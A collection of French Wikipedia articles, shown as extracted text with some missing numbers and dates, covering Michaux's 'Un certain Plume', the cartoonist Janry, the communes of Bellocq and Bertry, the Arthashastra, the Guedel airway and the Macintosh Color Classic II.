Freud, les surréalistes et l’onirisme.
Michaux est le contemporain de Sigmund Freud et des surréalistes (bien qu'il ait refusé d'être assimilé à ce courant) et comme beaucoup d’artistes de l’époque, le rêve et l’onirisme l’intéressent. Dans Un certain Plume, l’isotopie du sommeil est omniprésente et notre personnage, tantôt endormi, tantôt éveillé, n’est jamais bien loin d’un lit. Michaux se détache néanmoins de l’esthétique surréaliste dont il rejette la pratique de l’écriture automatique : les récits de rêve chez Michaux sont toujours situés dans un cadre narratif et descriptif, fût-il décousu. Il n’imite pas davantage les récits de rêve, son « écriture onirique réside bien dans une irruption constante du poétique dans la prose narrative, dans le décloisonnement des genres et des discours, enfin dans la transfiguration littéraire des rêves ».
Les bornes entre rêve et réalité sont estompées :
L’ellipse et le pli.
L'ellipse est un procédé de première importance dans ce recueil, mais aussi dans le reste de l'œuvre de Michaux. Souvent l'ellipse est amenée par l'endormissement de Plume, comme dans "La Nuit des Bulgares" ou encore dans "Un homme paisible". Ce procédé peut alors être interprété comme soulignant l'inconsistance de Plume, qui s'efface régulièrement des événements et n'a pas une vision continue de la réalité.Une ellipse est même figurée par la typographie dans "Dans les appartements de la Reine", après l'arrivée du Roi. Le texte est alors coupé par une ligne de points qui se tient à l'endroit où aurait dû se trouver le récit de la découverte de l'adultère par le Roi. Cette ligne de point a été commentée comme étant la trace d'un pli, l'esthétique du pli étant très importante dans l'œuvre de Michaux. Ce dernier a publié un recueil nommé "La Vie dans les plis", et la discontinuité est un thème que l'on retrouve dans sa peinture. Le pli pour Michaux figurerait le repli sur soi, la profondeur, comme si quelque chose de plus intérieur était enfoui sous le texte, et qu'il fallait le déplier pour amener à la surface, à la lumière du jour, cette intériorité. Plume aurait du mal à se déplier pour prendre sa place dans la société : il aurait plutôt tendance à se plier en quatre pour se conformer à ce qu'on attend de lui, comme dans "Plume voyage".
Questions éditoriales.
Éditions et rééditions.
"Un certain Plume" est le titre de trois publications distinctes de Henri Michaux.
Récapitulatif des versions du recueil "Un certain Plume".
Recueil "Un certain Plume" de 1930.
Première partie :
Deuxième partie : (seuls sont notés les textes dont Plume est le personnage. En vérité ce recueil est composé de cinq parties et comporte 34 textes.)
Recueil "Plume précédé de Lointain intérieur", 1938.
Partie : "Un certain Plume".
Adaptations de Plume.
Plume en peinture.
Plume a été représenté en peinture par Jean Dubuffet.
Les deux œuvres ont comme sous-titre, entre parenthèses : Portrait d'Henri Michaux.
Plume au théâtre.
"Un certain Plume" est un texte qui a connu plusieurs adaptations au théâtre :

</doc>
<doc id="191685" url="https://fr.wikipedia.org/wiki?curid=191685" title="Janry">
Janry

Janry, de son vrai nom Jean-Richard Geurts, né le à Jadotville, au Congo belge (aujourd'hui Likasi en République démocratique du Congo), est un auteur de bande dessinée belge.
Biographie.
Jean-Richard Geurts naît le à Jadotville. Il arrive à Bruxelles en 1967 avec ses parents. Copiant au début les dessins de son frère, il commence par enchaîner les dessins d'avions. Sa mère, souhaitant qu'il , l'inscrit à un cours de dessin en Belgique. Là, il se passionne pour le dessin et rencontre plus tard, dans une école d'arts graphiques son grand compagnon et futur scénariste Philippe Tome avec qui il signera plus tard sous les pseudonymes associés "Tome et Janry".
Au début des années 1980, ils entreprennent ensemble la reprise des "Aventures de Spirou et Fantasio". Ils signent au total , dans un style humoristique (à l'exception de leur dernier album, "Machine qui rêve" paru en 1998, dessiné dans un style semi-réaliste, une première remarquée dans l'histoire de la série).
Parallèlement aux "Aventures de Spirou et Fantasio", Tome et Janry créent en 1987 la série dérivée "Le Petit Spirou", proposition d'exploration de la jeunesse du héros, dont ils imaginent des histoires courtes.
La série rencontre un rapide succès, dépassant même celui du « grand » Spirou. Quand ils quittent les "Aventures de Spirou et Fantasio", Tome et Janry se concentrent donc sur cette série dérivée. Ils sortent trois albums entre 1990 et 1992, puis au moins un album tous les ans et demi, avec une prépublication des gags en une planche dans l'hebdomadaire jeunesse "Spirou".
En 1999, quand ils arrêtent officiellement "Spirou et Fantasio", laissant un album inachevé, intitulé provisoirement "Zorglub à Cuba", c'est pour se concentrer sur leur série dérivée, qui vient alors de livrer son huitième tome.
En 2001, à partir du tome 10 du "Petit Spirou", ils passent à un rythme de publication bi-annuel.
Parallèlement, Janry se lance dans l'écriture. En 1999, sort le premier album de la série humoristique "Passe-moi l'ciel", dessinée par le coloriste du "Petit Spirou", Stuf.
La série ne connaît pas un succès comparable au "Petit Spirou", mais sept albums sont édités, jusqu'en 2015. Fin novembre de cette même année, Janry annonce que désormais, il assurera aussi le dessin de la série, afin de "prolonger l'existence" de son collaborateur et ami disparu durant l'été précédent.
En 2013 et 2015, Janry dévoile "Les Aventures de Poussin 1er", une nouvelle série en tant que dessinateur, la première sans Philippe Tome : il s'agit de gags en une planche, scénarisés par l'auteur et romancier Éric-Emmanuel Schmitt.
Janry est également musicien, il joue de la basse dans le Boy's Bande dessinée.
Vie privée.
Après avoir longtemps vécu à Bruxelles, il demeure à Lathuy depuis 2000.
Œuvre.
Collectifs.
, 
,
Réception.
Autres honneurs.
L'astéroïde est nommé en son honneur.
Postérité.
La fresque murale Petit Spirou a été réalisée en lors des festivités célébrant le Centenaire de la bande dessinée. Elle est située Boulevard du Centenaire, Place de Bruparck. Sa réalisation est due aux artistes G. Oreopoulos et D. Vandegeerde d'Art Mural. Elle couvre une superficie approximative de .
En , une fresque inspirée de la série "Passe-moi l'ciel" est inaugurée au 91 rue des Minimes. La réalisation est due à Art Mural. Elle couvre une superficie de à Bruxelles. Elle fait partie du parcours BD de Bruxelles.

</doc>
<doc id="191686" url="https://fr.wikipedia.org/wiki?curid=191686" title="Bellocq">
Bellocq

Bellocq est une commune française, située dans le département des Pyrénées-Atlantiques en région Nouvelle-Aquitaine.
Géographie.
Localisation.
La commune de Bellocq se trouve dans le département des Pyrénées-Atlantiques, en région Nouvelle-Aquitaine.
Elle se situe à par la route de Pau, préfecture du département, et à d'Orthez, bureau centralisateur du canton d'Orthez et Terres des Gaves et du Sel dont dépend la commune depuis 2015 pour les élections départementales.
La commune fait en outre partie du bassin de vie de Salies-de-Béarn.
Les communes les plus proches sont : 
Puyoô (), Ramous (), Lahontan (), Bérenx (), Salies-de-Béarn (), Ossages (), Habas (), Baigts-de-Béarn ().
Sur le plan historique et culturel, Bellocq fait partie de la province du Béarn, qui fut également un État et qui présente une unité historique et culturelle à laquelle s’oppose une diversité frappante de paysages au relief tourmenté.
Hydrographie.
La commune est drainée par le gave de Pau, Arriou de Cazaubon, un bras du gave de Pau, un bras du gave de Pau, le ruisseau de Galihère, le ruisseau de l'Espérance, le ruisseau de Loulié, et par divers petits cours d'eau, constituant un réseau hydrographique de de longueur totale.
Le gave de Pau, d'une longueur totale de , prend sa source dans la commune de Gavarnie-Gèdre et s'écoule du sud-est vers le nord-ouest. Il traverse la commune et se jette dans l'Adour à Saint-Laurent-de-Gosse, après avoir traversé .
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat méditerranéen altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat de montagne et est dans la région climatique Pyrénées atlantiques, caractérisée par une pluviométrie élevée (&gt;) en toutes saisons, des hivers très doux ( en plaine) et des vents faibles. Elle est en outre dans la zone H2c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Orthez à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Milieux naturels et biodiversité.
Réseau Natura 2000.
Le réseau Natura 2000 est un réseau écologique européen de sites naturels d'intérêt écologique élaboré à partir des Directives « Habitats » et « Oiseaux », constitué de zones spéciales de conservation (ZSC) et de zones de protection spéciale (ZPS).
Un site Natura 2000 a été défini sur la commune au titre de la « directive Habitats » : le « gave de Pau », d'une superficie de , un vaste réseau hydrographique avec un système de saligues encore vivace.
Urbanisme.
Typologie.
Au , Bellocq est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Puyoô, une agglomération intra-départementale regroupant trois communes, dont elle est ville-centre. La commune est en outre hors attraction des villes.
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (63,6 % en 2018), en diminution par rapport à 1990 (67 %). La répartition détaillée en 2018 est la suivante : 
zones agricoles hétérogènes (33,2 %), forêts (25,3 %), terres arables (23,2 %), zones urbanisées (8 %), prairies (5 %), zones industrielles ou commerciales et réseaux de communication (3,1 %), cultures permanentes (2,2 %). L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communication et transports.
La commune est desservie par les routes départementales D 29 et D 430 ainsi que par l'autoroute A64 (sortie 7). De plus, la gare de la commune voisine est située sur la ligne Toulouse -Bayonne.
Bellocq est également desservie par le réseau d'autocars interurbains des Pyrénées-Atlantiques :
Risques majeurs.
Le territoire de la commune de Bellocq est vulnérable à différents aléas naturels : météorologiques (tempête, orage, neige, grand froid, canicule ou sécheresse), inondations, mouvements de terrains et séisme (sismicité modérée). Il est également exposé à un risque technologique, le transport de matières dangereuses. Un site publié par le BRGM permet d'évaluer simplement et rapidement les risques d'un bien localisé soit par son adresse soit par le numéro de sa parcelle.
Risques naturels.
Certaines parties du territoire communal sont susceptibles d’être affectées par le risque d’inondation par une crue torrentielle ou à montée rapide de cours d'eau, notamment le gave de Pau. La commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par les inondations et coulées de boue survenues en 1982, 1983, 1998, 2013, 2014 et 2018.
La commune est vulnérable au risque de mouvements de terrains constitué principalement du retrait-gonflement des sols argileux. 
Cet aléa est susceptible d'engendrer des dommages importants aux bâtiments en cas d’alternance de périodes de sécheresse et de pluie. 64,4 % de la superficie communale est en aléa moyen ou fort (59 % au niveau départemental et 48,5 % au niveau national). Depuis le , en application de la loi ELAN, différentes contraintes s'imposent aux vendeurs, maîtres d'ouvrages ou constructeurs de biens situés dans une zone classée en aléa moyen ou fort.
Concernant les mouvements de terrains, la commune a été reconnue en état de catastrophe naturelle au titre des dommages causés par la sécheresse en 1989 et 1990 et par des mouvements de terrain en 1983, 2014 et 2018.
Toponymie.
Attestations anciennes.
Le toponyme "Bellocq" apparaît sous les formes 
"Beitloc" (1119-1136 et 1150-1167, cartulaire de Sorde), 
"Pulcher Locus" (1286, registres de Bordeaux), 
"Lo loc de Begloc es bastide nueve et Begloc es poblat en la parropia de Salies" (1327, titres de Came), 
"Lo passadge de Begloc" (1442, contrats de Carresse - il y avait à cet endroit un bac sur le gave), 
"Nostre Done de Begloc" (1472, notaires de Labastide-Villefranche), 
"Lo castet de Belloc" (1536, réformation de Béarn), 
"Betloc" (1582, aliénations du diocèse de Dax), 
"Belloc" (1793 et 
"Bellocq" (fin , carte de Cassini).
Étymologie.
Pour Michel Grosclaude, le toponyme est formé du gascon "beg" (en orthographe actuelle "bèth"), « beau » et "lòc", « lieu », pour donner « beau lieu ».
Autres toponymes.
"Cabé" est une ferme, citée en 1537 dans la réformation de Béarn.
"Le Castéra" désignait un bois de la commune, déjà mentionné en 1675 sous la graphie "Castéraa" (réformation de Béarn).
"Le Castet" était un château et un fief relevant de la vicomté de Béarn.
"Peyresaube", ferme de Bellocq, apparaît sous les graphies "Peyres-Aubes" (1385, censier de Béarn) et "Peyresaubes" (1863, dictionnaire topographique Béarn-Pays basque).
Graphie béarnaise.
Son nom béarnais est "Bailòc" ou "Bèyloc".
Histoire.
Paul Raymond note qu'en 1385, Bellocq comptait quatre-vingt-cinq feux et dépendait du bailliage de "Rivière-Gave", nom d'un archiprêtré du diocèse de Dax qui tirait son nom du gave de Pau.
Politique et administration.
Le janvier 1973, les communes de Puyoô, Bellocq et Ramous sont fusionnées. La nouvelle commune prend le nom de Puyoô-Bellocq-Ramous. Elles redeviennent indépendantes le janvier 1984.
Intercommunalité.
Le janvier 2014, Bellocq intègre la communauté de communes de Lacq-Orthez.
Bellocq fait partie de cinq autres structures intercommunales :
Bellocq accueille le siège du syndicat mixte pour la création d'une zone d'activités de l'échangeur de Bellocq.
Population et société.
Démographie.
Le gentilé est "Bellocquais".
Économie.
La commune fait partie de la zone d'appellation d'origine contrôlée (AOC) du Béarn. Depuis 1991, l'AOC béarn-bellocq est attribuée aux vins récoltés sur les communes de Bellocq, Lahontan, Orthez et Salies-de-Béarn.
Bellocq fait également partie de la zone d'appellation de l'ossau-iraty.
Culture locale et patrimoine.
Patrimoine civil.
Le château de Bellocq date partiellement du . Il est classé par les monuments historiques depuis 1997.
Équipements.
Enseignement.
Bellocq dispose d'une école primaire.

</doc>
<doc id="191689" url="https://fr.wikipedia.org/wiki?curid=191689" title="Arthashâstra">
Arthashâstra

L’Arthashâstra (sanskrit IAST : "Arthaśāstra") est un traité ancien de politique, d'économie et de stratégie militaire, écrit en sanskrit, datant sans doute du avant l'ère commune. Le mot peut se traduire par "Traité de l'intérêt". L'ouvrage, attribué à Kautilya, est considéré comme « un monument exceptionnel de la pensée politique ancienne ».
Découverte.
L'ouvrage ne fut découvert qu'en 1905 dans un village du sud de l'Inde dans un état très mutilé et altéré. Une partie peut néanmoins prétendre à l'authenticité.
L'auteur.
On attribue le texte à Kautilya. Ce nom de Kautilya est identifié à un ministre de l'empereur indien Chandragupta Maurya (règne de 313 à 289 av. J.-C.); Charles Malamoud relève que "Kautilya" serait le surnom de Chanakya (alias Viṣṇugupta (Vishnugupta), le conseiller de Chandragupta.
L'identification habituelle de Kautilya ou de Vishnugupta avec le ministre Chānakya de Chandragupta Maurya date l'ouvrage du avant notre ère. Mais des affinités avec les "Smriti" et des références qui seraient anachroniques au suggèrent qu'il pourrait dater plutôt de la période allant du au de notre ère.
Selon l'encyclopédiste B. Walker, le nom infâmant de "Kautilya" — qui signifie en sanskrit « malhonnêteté », « fausseté » —, dissimule plutôt l'identité d'une école de philosophes politiques qui accepta cette épithète déshonorante pour couvrir les doctrines qu'elle enseignait. Un point de vue partagé par le sanskriste Louis Renou, selon qui ce nom de Kautilya n'a jamais dû s'appliquer à un individu particulier.
Thèse.
C'est un écrit essentiellement pragmatique, faisant fi, à l'instar de la position de Nicolas Machiavel, de toute considération morale et décrivant la manière de gérer un royaume, tant dans les affaires intérieures que dans la diplomatie vis-à-vis des voisins, alliés ou ennemis.
Il préconise une attitude très active et souvent guerrière : croissance est synonyme de conquêtes. Si ces dernières sont hasardeuses, l'auteur se sert alors de la duplicité pour parvenir à ses fins. La stabilité ne semble donc par essence que provisoire.
Le chercheur Jean Langlois décrit l"'Arthashastra" comme un traité sur l'art du pouvoir dans la tradition des miroirs des princes, où la politique est aussi séduction.
C'est de ce traité qu'est tirée la célèbre maxime : « Les ennemis de mes ennemis sont mes amis ».
Structure.
L'ouvrage comprend quinze livres, divisés en cent cinquante chapitres (un seul chapitre dans le livre XI, trente-six dans le livre II). Les cinq premiers livres sont consacrés à la politique intérieure, les dix autres à la diplomatie et à la stratégie. Ci-après, la liste des titres.

</doc>
<doc id="191690" url="https://fr.wikipedia.org/wiki?curid=191690" title="Canule de Guedel">
Canule de Guedel

La canule de Guedel est un dispositif médical inventé par Arthur Guedel, et qui permet de préserver le passage de l'air jusqu'aux poumons chez un humain inconscient.
Description et utilisation.
Une canule de Guedel appelée aussi canule oropharyngée est un tube semi-rigide en plastique, en forme de point d'interrogation utilisé pour maintenir les voies aériennes d'un patient ouvertes (empêche l'affaissement de la langue contre le pharynx).
Mise en place, elle n'élimine pas la nécessité de mettre le patient en position latérale de sécurité (PLS) : si elle empêche l'affaissement de la langue, elle n'empêche pas la fermeture de l'épiglotte ni le syndrome de Mendelson.
Chez un adulte, la canule est insérée pointe vers le haut, et retournée vers le bas lorsqu'elle est complètement enfoncée. Chez un enfant ou un nourrisson, la canule est insérée directement pointe vers le bas.
Les canules de Guedel ne doivent être utilisées que chez des patients inconscients (score de Glasgow inférieur à 5), en arrêt cardiorespiratoire ou sédaté (sinon il y aurait risque de provoquer un vomissement). Un patient reprenant conscience va spontanément chercher à recracher la canule lorsqu'il retrouvera le réflexe de la toux.

</doc>
<doc id="191691" url="https://fr.wikipedia.org/wiki?curid=191691" title="Macintosh Color Classic II">
Macintosh Color Classic II

Le Color Classic II était une grosse évolution du Color Classic : son processeur tournait à une vitesse d'horloge deux fois plus importante ( contre ), même s'il gardait un Motorola 68030, moins cher que les 68040. De plus, son bus de données fonctionnait en 32 bit (contre 16 bit pour le Color Classic) et il utilisait une mémoire plus rapide. Cela le rendait finalement environ deux fois et demi plus rapide que son prédécesseur, pour un prix identique. Ce fut le dernier Macintosh tout-en-un avec écran 10". Il était disponible avec un disque dur de 80 mo ou 160 mo.
Il fut d'abord commercialisé au Canada, puis en Europe et en Asie. Il ne fut vendu sur le marché des États-Unis que sous le nom de Performa 275, dont la seule différence avec le "Color Classic II" était l'offre logicielle fournie. Le "Performa 275" sera aussi commercialisé dans le reste du monde. Actuellement, le "Color Classic II" est particulièrement rare sur le marché de l'occasion.

</doc>
<doc id="191692" url="https://fr.wikipedia.org/wiki?curid=191692" title="Macintosh Performa 275">
Macintosh Performa 275



</doc>
<doc id="191694" url="https://fr.wikipedia.org/wiki?curid=191694" title="Bertry">
Bertry

Bertry est une commune française située dans le département du Nord, en région Hauts-de-France.
Ses habitants sont appelés les Bertrésiens.
Géographie.
Localisation.
Bertry est un bourg du Cambrésis jouxtant au nord celui de Caudry, situé à à vol d'oiseau à l'ouest du Cateau-Cambrésis, au nord-est de Saint-Quentin, aunord-est de Péronne, au sud-est de Cambrai, au sud de Valenciennes, au sud-ouest de la frontière franco-belge et au sud-ouest de Mons.
Il est aisément accessible par le tracé initial de l'ancienne Route nationale 32 (actuelle RD 932) qui relie Saint-Quentin à Bavay et à la frontière franco-belge.
Géologie et relief.
Comme une grande partie des communes du Cambrésis, Bertry est bâtie sur des couches de calcaire du Crétacé, elles-mêmes recouvertes de lœss et de limons accumulés par les vents, qui rendent le sol très fertile. C'est une terre à blé et à betteraves. Le paysage d'openfield domine la plus grande partie du pays.
Le village est bâti sur une pente qui descend vers les « riot Mauby » et « riot des Morts », entre approximativement au sud-est et au nord-ouest.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Torrent d'Esnes.
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Bertry est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Bertry, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (73,5 % en 2018), en diminution par rapport à 1990 (76,9 %). La répartition détaillée en 2018 est la suivante : 
terres arables (59,5 %), zones urbanisées (14,7 %), prairies (14 %), forêts (11,7 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Habitat et logement.
En 2019, le nombre total de logements dans la commune était de , alors qu'il était de en 2014 et de 976 en 2009.
Parmi ces logements, 89,5 % étaient des résidences principales, 1,8 % des résidences secondaires et 8,7 % des logements vacants. Ces logements étaient pour 96,1 % d'entre eux des maisons individuelles et pour 3,6 % des appartements.
Le tableau ci-dessous présente la typologie des logements à Bertry en 2019 en comparaison avec celle du Nord et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (1,8 %) supérieure à celle du département (1,6 %) et à celle de la France entière (9,7 %). Concernant le statut d'occupation de ces logements, 72,5 % des habitants de la commune sont propriétaires de leur logement (73,3 % en 2014), contre 54,7 % pour le Nord et 57,5 pour la France entière.
En 2019, la part de résidences principales datant d'avant 1946 s'élevait à 55,6 %. Pour les constructions plus récentes, 34,9 % des logements dataient d'entre 1946 et 1990 et 9,42 % d'après 1990
Voies de communication et transports.
Bertry est au croisement des routes départementales D115, D98 et D98c. La commune est desservie par une ligne du réseau CambrésiX, groupement composé de six entreprises de transport locales, vers Caudry et Le Cateau-Cambrésis.
La gare de Bertry est située sur la ligne ferroviaire Busigny - Somain. La gare est desservie par la ligne des TER Nord-Pas-de-Calais avec des trains vers Busigny (correspondances vers Saint-Quentin) et Cambrai (correspondances vers Douai et Lille).
Toponymie.
La plus ancienne mention du village se trouve dans un acte de 1176 par lequel Gérard de Saint-Aubert fait une donation à la léproserie de Cambrai. On trouve ensuite les noms "Berteries" (1224), "Berthreis" (1286), "Bertries" (1349 et 1471). Selon Eugène Mannier le nom dérive d'un nom propre, "Berther", "Berthier" ou "Bertarius".
Histoire.
Antiquité.
Pendant la période gallo-romaine, le territoire est peuplé par les Nerviens, dont les chefs-lieux sont Bavay puis Cambrai.
Moyen Âge.
Au Moyen Âge, le territoire de la commune est une seigneurie à haute, moyenne et basse justice.
Un autel est concédé en 1140 par l'évêque de Cambrai Nicolas de Chièvres. En 1224, le seigneur, Reinier de Boemont, accorde au village une charte communale, ce qui témoigne de son importance dès cette époque. Vers 1240, l'église est érigée en paroisse dotée d'un curé.
Temps modernes.
Un moulin banal est détruit en 1581, et un château-fort disparait au .
Révolution française et Empire.
Pendant la Révolution, on y envoie un détachement de soldats pour mettre fin à l'agitation.
Époque contemporaine.
Au la vie économique repose sur l'activité brassicole (on compta à Bertry jusqu'à 3 brasseries) et surtout le textile. Proche de Caudry, connue pour sa dentelle et de Villers-Outréaux, centre de la broderie, Bertry s'industrialise à la fin du en se spécialisant, comme d'autres communes de cette région (Bohain-en-Vermandois, Maretz) dans la « Haute Nouveauté », tissus nécessitant une forte technicité et destinés à la haute couture.
Le est mise en service la gare de Bertry sur la ligne de chemin de fer de Busigny à Somain via Cambrai; façilitant le déplacement des personnes et le transport des marchandises.
Le 4 décembre 1907, à deux cents mètres de la gare de Bertry, arrive le train 4804 composé de 39 wagons chargés de 650 tonnes de houille. La locomotive explose, tuant son chauffeur Désiré Jean-Baptiste Petit, 27 ans et son mécanicien Joseph Loucheux, 54 ans, tous deux du dépôt de Somain. La catastrophe se produit tout à côté d'habitations et de l'usine électrique.
Avant la Première Guerre mondiale, la population, qui n'a cessé de décliner jusqu'à aujourd'hui malgré une légère remontée dans les années 1990, s'élevait à plus de . À cette époque la majorité de la population était employée dans l'industrie textile, soit dans des fabriques, soit comme « extérieurs » travaillant « à façon ». Autour du textile d'autres professions s'employaient à la fabrication et à l'entretien du matériel. Dans les années 1970, des vagues de licenciements se terminèrent par la fermeture de toutes les fabriques de Haute Nouveauté à Bertry.
Politique et administration.
Rattachements administratifs et électoraux.
Rattachements administratifs.
La commune se trouve dans l'arrondissement de Cambrai du département du Nord.
Après avoir été Bertry rattachée en 1793 au canton du Cateau-Cambrésis) dans le district de Cambrai en 1793, Bertry est rattachée au canton de Clary à compter de 1801. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
Rattachements électoraux.
Pour les élections départementales, la commune fait partie depuis 2014 du canton du Cateau-Cambrésis
Pour l'élection des députés, elle fait partie de la dix-huitième circonscription du Nord.
Intercommunalité.
Bertry était membre de la communauté de communes de l'Espace Sud Cambrésis, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé en 2001 et auquel la commune avait transféré un certain nombre de ses compétences, dans les conditions déterminées par le code général des collectivités territoriales.
Cette intercommunalité a fusionné avec sa voisine pour former, le , la "communauté de communes du Caudrésis – Catésis" qui s'est transformée en 2019 en communauté d'agglomération sous la dénomination de communauté d'agglomération du Caudrésis - Catésis, et dont est désormais membre la commune.
Administration municipale.
La commune ayant entre et , son conseil municipal est constitué de 19 membres, y compris le maire et ses adjoints.
Tendances politiques et résultats.
Au deuxième tour de l'élection présidentielle de 2007, 45,56 % des électeurs ont voté pour Nicolas Sarkozy (UMP), et 54,44 % pour Ségolène Royal (PS), avec un taux de participation de 88,03 %.
Au deuxième tour des élections législatives de 2007, 49,62 % des électeurs de Bertry ont voté pour François-Xavier Villain (UMP) (57,45 % dans la du Nord), 50,38 % pour Brigitte Douay (PS) (42,55 % dans la circonscription), avec un taux de participation de 64,03 % à Bertry et de 60,08 % dans la circonscription.
Aux élections européennes de 2009, les deux meilleurs scores à Bertry étaient ceux de la liste du Parti socialiste conduite par Gilles Pargneaux, qui a obtenu soit 24,35 % des suffrages exprimés (département du Nord 19,55 %), et de la liste de la majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 22,26 % des suffrages exprimés (département du Nord 24,57 %) pour un taux de participation de 40,53 %.
Au deuxième tour des élections régionales de 2010, 53,53 % des suffrages exprimés sont allés à la liste conduite par Daniel Percheron (PS), 23,52 % à celle de Valérie Létard (UMP), et 22,94 % à la liste FN de Marine Le Pen, pour un taux de participation de 55,67 %.
Au premier tour de l'élection présidentielle de 2012, les quatre candidats arrivés en tête à Bertry sont François Hollande (PS, 28,26 %), Marine Le Pen (FN, 27,27 %), Nicolas Sarkozy (UMP, 21,17 %) et Jean-Luc Mélenchon (Front de gauche, 12,19 %) avec un taux de participation de 83,10 %.
Au premier tour de l'élection présidentielle de 2007, les quatre candidats arrivés en tête sont Marine Le Pen (36,64 % des suffrages exprimés), Jean-Luc Mélenchon (18,79 %), Emmanuel Macron (15,94 %) et François Fillon (11,90 %). Au second tour, les électeurs ont choisi Marine Le Pen à 58,31 % et Emmanuel Macron à 41,69 %. 24,73 % des électeurs se sont alors abstenus.
Au premier tour de l'élection présidentielle de 2022, les quatre candidats arrivés en tête sont Marine Le Pen (43,93 % des suffrages exprimés), Emmanuel Macron (20,62 %), Jean-Luc Mélenchon (14,38 %) et Éric Zemmour (6,07 %). Au second tour, les électeurs ont choisi Marine Le Pen à 65,91 % et Emmanuel Macron à 34,09 %. 28,63 % des électeurs se sont alors abstenus.
Équipements et services publics.
Enseignement.
La commune gère l'école maternelle Aurore (rénovée en 2021/2022), composée de quatre classes, et l'école primaire Jules-Leroux qui comporte six classes. Ces établissements scolarisent environ 240 élèves.
Les élèves poursuivent leurs études au collège Jean-Monnet et aux lycées de Caudry
Équipements culturels.
Bertry dispose d'une médiathèque.
Santé.
En 2012, on trouve à Bertry un cabinet de médecine, ainsi que des infirmières, kinésithérapeutes et podologue, et une pharmacie.
Justice, sécurité, secours et défense.
La ville de Bertry est dans le ressort de la cour d'appel de Douai, du tribunal judiciaire et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,3 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 26,3 % la même année, alors qu'il est de 22,5 % au niveau départemental.
